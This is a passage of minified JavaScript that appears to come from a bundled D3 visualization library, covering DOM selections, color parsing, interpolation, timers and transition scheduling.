t>=0&&(n=e.slice(0,t))!=="xmlns"&&(e=e.slice(t+1)),Dc.hasOwnProperty(n)?{space:Dc[n],local:e}:e}function cy(e){return function(){var n=this.ownerDocument,t=this.namespaceURI;return t===el&&n.documentElement.namespaceURI===el?n.createElement(e):n.createElementNS(t,e)}}function uy(e){return function(){return this.ownerDocument.createElementNS(e.space,e.local)}}function Td(e){var n=Ti(e);return(n.local?uy:cy)(n)}function py(){}function oo(e){return e==null?py:function(){return this.querySelector(e)}}function dy(e){typeof e!="function"&&(e=oo(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=new Array(a),o,c,u=0;u<a;++u)(o=i[u])&&(c=e.call(o,o.__data__,u,i))&&("__data__"in o&&(c.__data__=o.__data__),l[u]=c);return new Oe(s,this._parents)}function hy(e){return e==null?[]:Array.isArray(e)?e:Array.from(e)}function fy(){return[]}function Cd(e){return e==null?fy:function(){return this.querySelectorAll(e)}}function my(e){return function(){return hy(e.apply(this,arguments))}}function gy(e){typeof e=="function"?e=my(e):e=Cd(e);for(var n=this._groups,t=n.length,s=[],r=[],i=0;i<t;++i)for(var a=n[i],l=a.length,o,c=0;c<l;++c)(o=a[c])&&(s.push(e.call(o,o.__data__,c,a)),r.push(o));return new Oe(s,r)}function Pd(e){return function(){return this.matches(e)}}function Ad(e){return function(n){return n.matches(e)}}var yy=Array.prototype.find;function vy(e){return function(){return yy.call(this.children,e)}}function wy(){return this.firstElementChild}function ky(e){return this.select(e==null?wy:vy(typeof e=="function"?e:Ad(e)))}var by=Array.prototype.filter;function xy(){return Array.from(this.children)}function Sy(e){return function(){return by.call(this.children,e)}}function _y(e){return this.selectAll(e==null?xy:Sy(typeof e=="function"?e:Ad(e)))}function Ey(e){typeof e!="function"&&(e=Pd(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=[],o,c=0;c<a;++c)(o=i[c])&&e.call(o,o.__data__,c,i)&&l.push(o);return new Oe(s,this._parents)}function Ld(e){return new Array(e.length)}function Ty(){return new Oe(this._enter||this._groups.map(Ld),this._parents)}function si(e,n){this.ownerDocument=e.ownerDocument,this.namespaceURI=e.namespaceURI,this._next=null,this._parent=e,this.__data__=n}si.prototype={constructor:si,appendChild:function(e){return this._parent.insertBefore(e,this._next)},insertBefore:function(e,n){return this._parent.insertBefore(e,n)},querySelector:function(e){return this._parent.querySelector(e)},querySelectorAll:function(e){return this._parent.querySelectorAll(e)}};function Cy(e){return function(){return e}}function Py(e,n,t,s,r,i){for(var a=0,l,o=n.length,c=i.length;a<c;++a)(l=n[a])?(l.__data__=i[a],s[a]=l):t[a]=new si(e,i[a]);for(;a<o;++a)(l=n[a])&&(r[a]=l)}function Ay(e,n,t,s,r,i,a){var l,o,c=new Map,u=n.length,d=i.length,h=new Array(u),y;for(l=0;l<u;++l)(o=n[l])&&(h[l]=y=a.call(o,o.__data__,l,n)+"",c.has(y)?r[l]=o:c.set(y,o));for(l=0;l<d;++l)y=a.call(e,i[l],l,i)+"",(o=c.get(y))?(s[l]=o,o.__data__=i[l],c.delete(y)):t[l]=new si(e,i[l]);for(l=0;l<u;++l)(o=n[l])&&c.get(h[l])===o&&(r[l]=o)}function Ly(e){return e.__data__}function Ny(e,n){if(!arguments.length)return Array.from(this,Ly);var t=n?Ay:Py,s=this._parents,r=this._groups;typeof e!="function"&&(e=Cy(e));for(var i=r.length,a=new Array(i),l=new Array(i),o=new Array(i),c=0;c<i;++c){var u=s[c],d=r[c],h=d.length,y=Ry(e.call(u,u&&u.__data__,c,s)),k=y.length,x=l[c]=new Array(k),L=a[c]=new Array(k),p=o[c]=new Array(h);t(u,d,x,L,p,y,n);for(var f=0,m=0,S,T;f<k;++f)if(S=x[f]){for(f>=m&&(m=f+1);!(T=L[m])&&++m<k;);S._next=T||null}}return a=new Oe(a,s),a._enter=l,a._exit=o,a}function Ry(e){return typeof e=="object"&&"length"in e?e:Array.from(e)}function Oy(){return new Oe(this._exit||this._groups.map(Ld),this._parents)}function My(e,n,t){var s=this.enter(),r=this,i=this.exit();return typeof e=="function"?(s=e(s),s&&(s=s.selection())):s=s.append(e+""),n!=null&&(r=n(r),r&&(r=r.selection())),t==null?i.remove():t(i),s&&r?s.merge(r).order():r}function Iy(e){for(var n=e.selection?e.selection():e,t=this._groups,s=n._groups,r=t.length,i=s.length,a=Math.min(r,i),l=new Array(r),o=0;o<a;++o)for(var c=t[o],u=s[o],d=c.length,h=l[o]=new Array(d),y,k=0;k<d;++k)(y=c[k]||u[k])&&(h[k]=y);for(;o<r;++o)l[o]=t[o];return new Oe(l,this._parents)}function zy(){for(var e=this._groups,n=-1,t=e.length;++n<t;)for(var s=e[n],r=s.length-1,i=s[r],a;--r>=0;)(a=s[r])&&(i&&a.compareDocumentPosition(i)^4&&i.parentNode.insertBefore(a,i),i=a);return this}function Dy(e){e||(e=jy);function n(d,h){return d&&h?e(d.__data__,h.__data__):!d-!h}for(var t=this._groups,s=t.length,r=new Array(s),i=0;i<s;++i){for(var a=t[i],l=a.length,o=r[i]=new Array(l),c,u=0;u<l;++u)(c=a[u])&&(o[u]=c);o.sort(n)}return new Oe(r,this._parents).order()}function jy(e,n){return e<n?-1:e>n?1:e>=n?0:NaN}function By(){var e=arguments[0];return arguments[0]=this,e.apply(null,arguments),this}function Fy(){return Array.from(this)}function Uy(){for(var e=this._groups,n=0,t=e.length;n<t;++n)for(var s=e[n],r=0,i=s.length;r<i;++r){var a=s[r];if(a)return a}return null}function Hy(){let e=0;for(const n of this)++e;return e}function Vy(){return!this.node()}function Wy(e){for(var n=this._groups,t=0,s=n.length;t<s;++t)for(var r=n[t],i=0,a=r.length,l;i<a;++i)(l=r[i])&&e.call(l,l.__data__,i,r);return this}function $y(e){return function(){this.removeAttribute(e)}}function Gy(e){return function(){this.removeAttributeNS(e.space,e.local)}}function Yy(e,n){return function(){this.setAttribute(e,n)}}function qy(e,n){return function(){this.setAttributeNS(e.space,e.local,n)}}function Xy(e,n){return function(){var t=n.apply(this,arguments);t==null?this.removeAttribute(e):this.setAttribute(e,t)}}function Ky(e,n){return function(){var t=n.apply(this,arguments);t==null?this.removeAttributeNS(e.space,e.local):this.setAttributeNS(e.space,e.local,t)}}function Qy(e,n){var t=Ti(e);if(arguments.length<2){var s=this.node();return t.local?s.getAttributeNS(t.space,t.local):s.getAttribute(t)}return this.each((n==null?t.local?Gy:$y:typeof n=="function"?t.local?Ky:Xy:t.local?qy:Yy)(t,n))}function Nd(e){return e.ownerDocument&&e.ownerDocument.defaultView||e.document&&e||e.defaultView}function Zy(e){return function(){this.style.removeProperty(e)}}function Jy(e,n,t){return function(){this.style.setProperty(e,n,t)}}function ev(e,n,t){return function(){var s=n.apply(this,arguments);s==null?this.style.removeProperty(e):this.style.setProperty(e,s,t)}}function nv(e,n,t){return arguments.length>1?this.each((n==null?Zy:typeof n=="function"?ev:Jy)(e,n,t??"")):Ft(this.node(),e)}function Ft(e,n){return e.style.getPropertyValue(n)||Nd(e).getComputedStyle(e,null).getPropertyValue(n)}function tv(e){return function(){delete this[e]}}function sv(e,n){return function(){this[e]=n}}function rv(e,n){return function(){var t=n.apply(this,arguments);t==null?delete this[e]:this[e]=t}}function iv(e,n){return arguments.length>1?this.each((n==null?tv:typeof n=="function"?rv:sv)(e,n)):this.node()[e]}function Rd(e){return e.trim().split(/^|\s+/)}function co(e){return e.classList||new Od(e)}function Od(e){this._node=e,this._names=Rd(e.getAttribute("class")||"")}Od.prototype={add:function(e){var n=this._names.indexOf(e);n<0&&(this._names.push(e),this._node.setAttribute("class",this._names.join(" ")))},remove:function(e){var n=this._names.indexOf(e);n>=0&&(this._names.splice(n,1),this._node.setAttribute("class",this._names.join(" ")))},contains:function(e){return this._names.indexOf(e)>=0}};function Md(e,n){for(var t=co(e),s=-1,r=n.length;++s<r;)t.add(n[s])}function Id(e,n){for(var t=co(e),s=-1,r=n.length;++s<r;)t.remove(n[s])}function av(e){return function(){Md(this,e)}}function lv(e){return function(){Id(this,e)}}function ov(e,n){return function(){(n.apply(this,arguments)?Md:Id)(this,e)}}function cv(e,n){var t=Rd(e+"");if(arguments.length<2){for(var s=co(this.node()),r=-1,i=t.length;++r<i;)if(!s.contains(t[r]))return!1;return!0}return this.each((typeof n=="function"?ov:n?av:lv)(t,n))}function uv(){this.textContent=""}function pv(e){return function(){this.textContent=e}}function dv(e){return function(){var n=e.apply(this,arguments);this.textContent=n??""}}function hv(e){return arguments.length?this.each(e==null?uv:(typeof e=="function"?dv:pv)(e)):this.node().textContent}function fv(){this.innerHTML=""}function mv(e){return function(){this.innerHTML=e}}function gv(e){return function(){var n=e.apply(this,arguments);this.innerHTML=n??""}}function yv(e){return arguments.length?this.each(e==null?fv:(typeof e=="function"?gv:mv)(e)):this.node().innerHTML}function vv(){this.nextSibling&&this.parentNode.appendChild(this)}function wv(){return this.each(vv)}function kv(){this.previousSibling&&this.parentNode.insertBefore(this,this.parentNode.firstChild)}function bv(){return this.each(kv)}function xv(e){var n=typeof e=="function"?e:Td(e);return this.select(function(){return this.appendChild(n.apply(this,arguments))})}function Sv(){return null}function _v(e,n){var t=typeof e=="function"?e:Td(e),s=n==null?Sv:typeof n=="function"?n:oo(n);return this.select(function(){return this.insertBefore(t.apply(this,arguments),s.apply(this,arguments)||null)})}function Ev(){var e=this.parentNode;e&&e.removeChild(this)}function Tv(){return this.each(Ev)}function Cv(){var e=this.cloneNode(!1),n=this.parentNode;return n?n.insertBefore(e,this.nextSibling):e}function Pv(){var e=this.cloneNode(!0),n=this.parentNode;return n?n.insertBefore(e,this.nextSibling):e}function Av(e){return this.select(e?Pv:Cv)}function Lv(e){return arguments.length?this.property("__data__",e):this.node().__data__}function Nv(e){return function(n){e.call(this,n,this.__data__)}}function Rv(e){return e.trim().split(/^|\s+/).map(function(n){var t="",s=n.indexOf(".");return s>=0&&(t=n.slice(s+1),n=n.slice(0,s)),{type:n,name:t}})}function Ov(e){return function(){var n=this.__on;if(n){for(var t=0,s=-1,r=n.length,i;t<r;++t)i=n[t],(!e.type||i.type===e.type)&&i.name===e.name?this.removeEventListener(i.type,i.listener,i.options):n[++s]=i;++s?n.length=s:delete this.__on}}}function Mv(e,n,t){return function(){var s=this.__on,r,i=Nv(n);if(s){for(var a=0,l=s.length;a<l;++a)if((r=s[a]).type===e.type&&r.name===e.name){this.removeEventListener(r.type,r.listener,r.options),this.addEventListener(r.type,r.listener=i,r.options=t),r.value=n;return}}this.addEventListener(e.type,i,t),r={type:e.type,name:e.name,value:n,listener:i,options:t},s?s.push(r):this.__on=[r]}}function Iv(e,n,t){var s=Rv(e+""),r,i=s.length,a;if(arguments.length<2){var l=this.node().__on;if(l){for(var o=0,c=l.length,u;o<c;++o)for(r=0,u=l[o];r<i;++r)if((a=s[r]).type===u.type&&a.name===u.name)return u.value}return}for(l=n?Mv:Ov,r=0;r<i;++r)this.each(l(s[r],n,t));return this}function zd(e,n,t){var s=Nd(e),r=s.CustomEvent;typeof r=="function"?r=new r(n,t):(r=s.document.createEvent("Event"),t?(r.initEvent(n,t.bubbles,t.cancelable),r.detail=t.detail):r.initEvent(n,!1,!1)),e.dispatchEvent(r)}function zv(e,n){return function(){return zd(this,e,n)}}function Dv(e,n){return function(){return zd(this,e,n.apply(this,arguments))}}function jv(e,n){return this.each((typeof n=="function"?Dv:zv)(e,n))}function*Bv(){for(var e=this._groups,n=0,t=e.length;n<t;++n)for(var s=e[n],r=0,i=s.length,a;r<i;++r)(a=s[r])&&(yield a)}var Dd=[null];function Oe(e,n){this._groups=e,this._parents=n}function Ys(){return new Oe([[document.documentElement]],Dd)}function Fv(){return this}Oe.prototype=Ys.prototype={constructor:Oe,select:dy,selectAll:gy,selectChild:ky,selectChildren:_y,filter:Ey,data:Ny,enter:Ty,exit:Oy,join:My,merge:Iy,selection:Fv,order:zy,sort:Dy,call:By,nodes:Fy,node:Uy,size:Hy,empty:Vy,each:Wy,attr:Qy,style:nv,property:iv,classed:cv,text:hv,html:yv,raise:wv,lower:bv,append:xv,insert:_v,remove:Tv,clone:Av,datum:Lv,on:Iv,dispatch:jv,[Symbol.iterator]:Bv};function Tn(e){return typeof e=="string"?new Oe([[document.querySelector(e)]],[document.documentElement]):new Oe([[e]],Dd)}function Uv(e){let n;for(;n=e.sourceEvent;)e=n;return e}function Gn(e,n){if(e=Uv(e),n===void 0&&(n=e.currentTarget),n){var t=n.ownerSVGElement||n;if(t.createSVGPoint){var s=t.createSVGPoint();return s.x=e.clientX,s.y=e.clientY,s=s.matrixTransform(n.getScreenCTM().inverse()),[s.x,s.y]}if(n.getBoundingClientRect){var r=n.getBoundingClientRect();return[e.clientX-r.left-n.clientLeft,e.clientY-r.top-n.clientTop]}}return[e.pageX,e.pageY]}const nl={capture:!0,passive:!1};function tl(e){e.preventDefault(),e.stopImmediatePropagation()}function Hv(e){var n=e.document.documentElement,t=Tn(e).on("dragstart.drag",tl,nl);"onselectstart"in n?t.on("selectstart.drag",tl,nl):(n.__noselect=n.style.MozUserSelect,n.style.MozUserSelect="none")}function Vv(e,n){var t=e.document.documentElement,s=Tn(e).on("dragstart.drag",null);n&&(s.on("click.drag",tl,nl),setTimeout(function(){s.on("click.drag",null)},0)),"onselectstart"in t?s.on("selectstart.drag",null):(t.style.MozUserSelect=t.__noselect,delete t.__noselect)}function uo(e,n,t){e.prototype=n.prototype=t,t.constructor=e}function jd(e,n){var t=Object.create(e.prototype);for(var s in n)t[s]=n[s];return t}function qs(){}var zs=.7,ri=1/zs,Rt="\\s*([+-]?\\d+)\\s*",Ds="\\s*([+-]?(?:\\d*\\.)?\\d+(?:[eE][+-]?\\d+)?)\\s*",sn="\\s*([+-]?(?:\\d*\\.)?\\d+(?:[eE][+-]?\\d+)?)%\\s*",Wv=/^#([0-9a-f]{3,8})$/,$v=new RegExp(`^rgb\\(${Rt},${Rt},${Rt}\\)$`),Gv=new RegExp(`^rgb\\(${sn},${sn},${sn}\\)$`),Yv=new RegExp(`^rgba\\(${Rt},${Rt},${Rt},${Ds}\\)$`),qv=new RegExp(`^rgba\\(${sn},${sn},${sn},${Ds}\\)$`),Xv=new RegExp(`^hsl\\(${Ds},${sn},${sn}\\)$`),Kv=new RegExp(`^hsla\\(${Ds},${sn},${sn},${Ds}\\)$`),jc={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};uo(qs,js,{copy(e){return Object.assign(new this.constructor,this,e)},displayable(){return this.rgb().displayable()},hex:Bc,formatHex:Bc,formatHex8:Qv,formatHsl:Zv,formatRgb:Fc,toString:Fc});function Bc(){return this.rgb().formatHex()}function Qv(){return this.rgb().formatHex8()}function Zv(){return Bd(this).formatHsl()}function Fc(){return this.rgb().formatRgb()}function js(e){var n,t;return e=(e+"").trim().toLowerCase(),(n=Wv.exec(e))?(t=n[1].length,n=parseInt(n[1],16),t===6?Uc(n):t===3?new Ee(n>>8&15|n>>4&240,n>>4&15|n&240,(n&15)<<4|n&15,1):t===8?dr(n>>24&255,n>>16&255,n>>8&255,(n&255)/255):t===4?dr(n>>12&15|n>>8&240,n>>8&15|n>>4&240,n>>4&15|n&240,((n&15)<<4|n&15)/255):null):(n=$v.exec(e))?new Ee(n[1],n[2],n[3],1):(n=Gv.exec(e))?new Ee(n[1]*255/100,n[2]*255/100,n[3]*255/100,1):(n=Yv.exec(e))?dr(n[1],n[2],n[3],n[4]):(n=qv.exec(e))?dr(n[1]*255/100,n[2]*255/100,n[3]*255/100,n[4]):(n=Xv.exec(e))?Wc(n[1],n[2]/100,n[3]/100,1):(n=Kv.exec(e))?Wc(n[1],n[2]/100,n[3]/100,n[4]):jc.hasOwnProperty(e)?Uc(jc[e]):e==="transparent"?new Ee(NaN,NaN,NaN,0):null}function Uc(e){return new Ee(e>>16&255,e>>8&255,e&255,1)}function dr(e,n,t,s){return s<=0&&(e=n=t=NaN),new Ee(e,n,t,s)}function Jv(e){return e instanceof qs||(e=js(e)),e?(e=e.rgb(),new Ee(e.r,e.g,e.b,e.opacity)):new Ee}function sl(e,n,t,s){return arguments.length===1?Jv(e):new Ee(e,n,t,s??1)}function Ee(e,n,t,s){this.r=+e,this.g=+n,this.b=+t,this.opacity=+s}uo(Ee,sl,jd(qs,{brighter(e){return e=e==null?ri:Math.pow(ri,e),new Ee(this.r*e,this.g*e,this.b*e,this.opacity)},darker(e){return e=e==null?zs:Math.pow(zs,e),new Ee(this.r*e,this.g*e,this.b*e,this.opacity)},rgb(){return this},clamp(){return new Ee(nt(this.r),nt(this.g),nt(this.b),ii(this.opacity))},displayable(){return-.5<=this.r&&this.r<255.5&&-.5<=this.g&&this.g<255.5&&-.5<=this.b&&this.b<255.5&&0<=this.opacity&&this.opacity<=1},hex:Hc,formatHex:Hc,formatHex8:e0,formatRgb:Vc,toString:Vc}));function Hc(){return`#${Zn(this.r)}${Zn(this.g)}${Zn(this.b)}`}function e0(){return`#${Zn(this.r)}${Zn(this.g)}${Zn(this.b)}${Zn((isNaN(this.opacity)?1:this.opacity)*255)}`}function Vc(){const e=ii(this.opacity);return`${e===1?"rgb(":"rgba("}${nt(this.r)}, ${nt(this.g)}, ${nt(this.b)}${e===1?")":`, ${e})`}`}function ii(e){return isNaN(e)?1:Math.max(0,Math.min(1,e))}function nt(e){return Math.max(0,Math.min(255,Math.round(e)||0))}function Zn(e){return e=nt(e),(e<16?"0":"")+e.toString(16)}function Wc(e,n,t,s){return s<=0?e=n=t=NaN:t<=0||t>=1?e=n=NaN:n<=0&&(e=NaN),new Ye(e,n,t,s)}function Bd(e){if(e instanceof Ye)return new Ye(e.h,e.s,e.l,e.opacity);if(e instanceof qs||(e=js(e)),!e)return new Ye;if(e instanceof Ye)return e;e=e.rgb();var n=e.r/255,t=e.g/255,s=e.b/255,r=Math.min(n,t,s),i=Math.max(n,t,s),a=NaN,l=i-r,o=(i+r)/2;return l?(n===i?a=(t-s)/l+(t<s)*6:t===i?a=(s-n)/l+2:a=(n-t)/l+4,l/=o<.5?i+r:2-i-r,a*=60):l=o>0&&o<1?0:a,new Ye(a,l,o,e.opacity)}function n0(e,n,t,s){return arguments.length===1?Bd(e):new Ye(e,n,t,s??1)}function Ye(e,n,t,s){this.h=+e,this.s=+n,this.l=+t,this.opacity=+s}uo(Ye,n0,jd(qs,{brighter(e){return e=e==null?ri:Math.pow(ri,e),new Ye(this.h,this.s,this.l*e,this.opacity)},darker(e){return e=e==null?zs:Math.pow(zs,e),new Ye(this.h,this.s,this.l*e,this.opacity)},rgb(){var e=this.h%360+(this.h<0)*360,n=isNaN(e)||isNaN(this.s)?0:this.s,t=this.l,s=t+(t<.5?t:1-t)*n,r=2*t-s;return new Ee(ta(e>=240?e-240:e+120,r,s),ta(e,r,s),ta(e<120?e+240:e-120,r,s),this.opacity)},clamp(){return new Ye($c(this.h),hr(this.s),hr(this.l),ii(this.opacity))},displayable(){return(0<=this.s&&this.s<=1||isNaN(this.s))&&0<=this.l&&this.l<=1&&0<=this.opacity&&this.opacity<=1},formatHsl(){const e=ii(this.opacity);return`${e===1?"hsl(":"hsla("}${$c(this.h)}, ${hr(this.s)*100}%, ${hr(this.l)*100}%${e===1?")":`, ${e})`}`}}));function $c(e){return e=(e||0)%360,e<0?e+360:e}function hr(e){return Math.max(0,Math.min(1,e||0))}function ta(e,n,t){return(e<60?n+(t-n)*e/60:e<180?t:e<240?n+(t-n)*(240-e)/60:n)*255}const Fd=e=>()=>e;function t0(e,n){return function(t){return e+t*n}}function s0(e,n,t){return e=Math.pow(e,t),n=Math.pow(n,t)-e,t=1/t,function(s){return Math.pow(e+s*n,t)}}function r0(e){return(e=+e)==1?Ud:function(n,t){return t-n?s0(n,t,e):Fd(isNaN(n)?t:n)}}function Ud(e,n){var t=n-e;return t?t0(e,t):Fd(isNaN(e)?n:e)}const Gc=function e(n){var t=r0(n);function s(r,i){var a=t((r=sl(r)).r,(i=sl(i)).r),l=t(r.g,i.g),o=t(r.b,i.b),c=Ud(r.opacity,i.opacity);return function(u){return r.r=a(u),r.g=l(u),r.b=o(u),r.opacity=c(u),r+""}}return s.gamma=e,s}(1);function Sn(e,n){return e=+e,n=+n,function(t){return e*(1-t)+n*t}}var rl=/[-+]?(?:\d+\.?\d*|\.?\d+)(?:[eE][-+]?\d+)?/g,sa=new RegExp(rl.source,"g");function i0(e){return function(){return e}}function a0(e){return function(n){return e(n)+""}}function l0(e,n){var t=rl.lastIndex=sa.lastIndex=0,s,r,i,a=-1,l=[],o=[];for(e=e+"",n=n+"";(s=rl.exec(e))&&(r=sa.exec(n));)(i=r.index)>t&&(i=n.slice(t,i),l[a]?l[a]+=i:l[++a]=i),(s=s[0])===(r=r[0])?l[a]?l[a]+=r:l[++a]=r:(l[++a]=null,o.push({i:a,x:Sn(s,r)})),t=sa.lastIndex;return t<n.length&&(i=n.slice(t),l[a]?l[a]+=i:l[++a]=i),l.length<2?o[0]?a0(o[0].x):i0(n):(n=o.length,function(c){for(var u=0,d;u<n;++u)l[(d=o[u]).i]=d.x(c);return l.join("")})}var Yc=180/Math.PI,il={translateX:0,translateY:0,rotate:0,skewX:0,scaleX:1,scaleY:1};function Hd(e,n,t,s,r,i){var a,l,o;return(a=Math.sqrt(e*e+n*n))&&(e/=a,n/=a),(o=e*t+n*s)&&(t-=e*o,s-=n*o),(l=Math.sqrt(t*t+s*s))&&(t/=l,s/=l,o/=l),e*s<n*t&&(e=-e,n=-n,o=-o,a=-a),{translateX:r,translateY:i,rotate:Math.atan2(n,e)*Yc,skewX:Math.atan(o)*Yc,scaleX:a,scaleY:l}}var fr;function o0(e){const n=new(typeof DOMMatrix=="function"?DOMMatrix:WebKitCSSMatrix)(e+"");return n.isIdentity?il:Hd(n.a,n.b,n.c,n.d,n.e,n.f)}function c0(e){return e==null||(fr||(fr=document.createElementNS("http://www.w3.org/2000/svg","g")),fr.setAttribute("transform",e),!(e=fr.transform.baseVal.consolidate()))?il:(e=e.matrix,Hd(e.a,e.b,e.c,e.d,e.e,e.f))}function Vd(e,n,t,s){function r(c){return c.length?c.pop()+" ":""}function i(c,u,d,h,y,k){if(c!==d||u!==h){var x=y.push("translate(",null,n,null,t);k.push({i:x-4,x:Sn(c,d)},{i:x-2,x:Sn(u,h)})}else(d||h)&&y.push("translate("+d+n+h+t)}function a(c,u,d,h){c!==u?(c-u>180?u+=360:u-c>180&&(c+=360),h.push({i:d.push(r(d)+"rotate(",null,s)-2,x:Sn(c,u)})):u&&d.push(r(d)+"rotate("+u+s)}function l(c,u,d,h){c!==u?h.push({i:d.push(r(d)+"skewX(",null,s)-2,x:Sn(c,u)}):u&&d.push(r(d)+"skewX("+u+s)}function o(c,u,d,h,y,k){if(c!==d||u!==h){var x=y.push(r(y)+"scale(",null,",",null,")");k.push({i:x-4,x:Sn(c,d)},{i:x-2,x:Sn(u,h)})}else(d!==1||h!==1)&&y.push(r(y)+"scale("+d+","+h+")")}return function(c,u){var d=[],h=[];return c=e(c),u=e(u),i(c.translateX,c.translateY,u.translateX,u.translateY,d,h),a(c.rotate,u.rotate,d,h),l(c.skewX,u.skewX,d,h),o(c.scaleX,c.scaleY,u.scaleX,u.scaleY,d,h),c=u=null,function(y){for(var k=-1,x=h.length,L;++k<x;)d[(L=h[k]).i]=L.x(y);return d.join("")}}}var u0=Vd(o0,"px, ","px)","deg)"),p0=Vd(c0,", ",")",")"),d0=1e-12;function qc(e){return((e=Math.exp(e))+1/e)/2}function h0(e){return((e=Math.exp(e))-1/e)/2}function f0(e){return((e=Math.exp(2*e))-1)/(e+1)}const m0=function e(n,t,s){function r(i,a){var l=i[0],o=i[1],c=i[2],u=a[0],d=a[1],h=a[2],y=u-l,k=d-o,x=y*y+k*k,L,p;if(x<d0)p=Math.log(h/c)/n,L=function(b){return[l+b*y,o+b*k,c*Math.exp(n*b*p)]};else{var f=Math.sqrt(x),m=(h*h-c*c+s*x)/(2*c*t*f),S=(h*h-c*c-s*x)/(2*h*t*f),T=Math.log(Math.sqrt(m*m+1)-m),v=Math.log(Math.sqrt(S*S+1)-S);p=(v-T)/n,L=function(b){var E=b*p,I=qc(T),M=c/(t*f)*(I*f0(n*E+T)-h0(T));return[l+M*y,o+M*k,c*I/qc(n*E+T)]}}return L.duration=p*1e3*n/Math.SQRT2,L}return r.rho=function(i){var a=Math.max(.001,+i),l=a*a,o=l*l;return e(a,l,o)},r}(Math.SQRT2,2,4);var Ut=0,as=0,es=0,Wd=1e3,ai,ls,li=0,lt=0,Ci=0,Bs=typeof performance=="object"&&performance.now?performance:Date,$d=typeof window=="object"&&window.requestAnimationFrame?window.requestAnimationFrame.bind(window):function(e){setTimeout(e,17)};function po(){return lt||($d(g0),lt=Bs.now()+Ci)}function g0(){lt=0}function oi(){this._call=this._time=this._next=null}oi.prototype=Gd.prototype={constructor:oi,restart:function(e,n,t){if(typeof e!="function")throw new TypeError("callback is not a function");t=(t==null?po():+t)+(n==null?0:+n),!this._next&&ls!==this&&(ls?ls._next=this:ai=this,ls=this),this._call=e,this._time=t,al()},stop:function(){this._call&&(this._call=null,this._time=1/0,al())}};function Gd(e,n,t){var s=new oi;return s.restart(e,n,t),s}function y0(){po(),++Ut;for(var e=ai,n;e;)(n=lt-e._time)>=0&&e._call.call(void 0,n),e=e._next;--Ut}function Xc(){lt=(li=Bs.now())+Ci,Ut=as=0;try{y0()}finally{Ut=0,w0(),lt=0}}function v0(){var e=Bs.now(),n=e-li;n>Wd&&(Ci-=n,li=e)}function w0(){for(var e,n=ai,t,s=1/0;n;)n._call?(s>n._time&&(s=n._time),e=n,n=n._next):(t=n._next,n._next=null,n=e?e._next=t:ai=t);ls=e,al(s)}function al(e){if(!Ut){as&&(as=clearTimeout(as));var n=e-lt;n>24?(e<1/0&&(as=setTimeout(Xc,e-Bs.now()-Ci)),es&&(es=clearInterval(es))):(es||(li=Bs.now(),es=setInterval(v0,Wd)),Ut=1,$d(Xc))}}function Kc(e,n,t){var s=new oi;return n=n==null?0:+n,s.restart(r=>{s.stop(),e(r+n)},n,t),s}var k0=lo("start","end","cancel","interrupt"),b0=[],Yd=0,Qc=1,ll=2,Ar=3,Zc=4,ol=5,Lr=6;function Pi(e,n,t,s,r,i){var a=e.__transition;if(!a)e.__transition={};else if(t in a)return;x0(e,t,{name:n,index:s,group:r,on:k0,tween:b0,time:i.time,delay:i.delay,duration:i.duration,ease:i.ease,timer:null,state:Yd})}function ho(e,n){var t=Qe(e,n);if(t.state>Yd)throw new Error("too late; already scheduled");return t}function rn(e,n){var t=Qe(e,n);if(t.state>Ar)throw new Error("too late; already running");return t}function Qe(e,n){var t=e.__transition;if(!t||!(t=t[n]))throw new Error("transition not found");return t}function x0(e,n,t){var s=e.__transition,r;s[n]=t,t.timer=Gd(i,0,t.time);function i(c){t.state=Qc,t.timer.restart(a,t.delay,t.time),t.delay<=c&&a(c-t.delay)}function a(c){var u,d,h,y;if(t.state!==Qc)return o();for(u in s)if(y=s[u],y.name===t.name){if(y.state===Ar)return 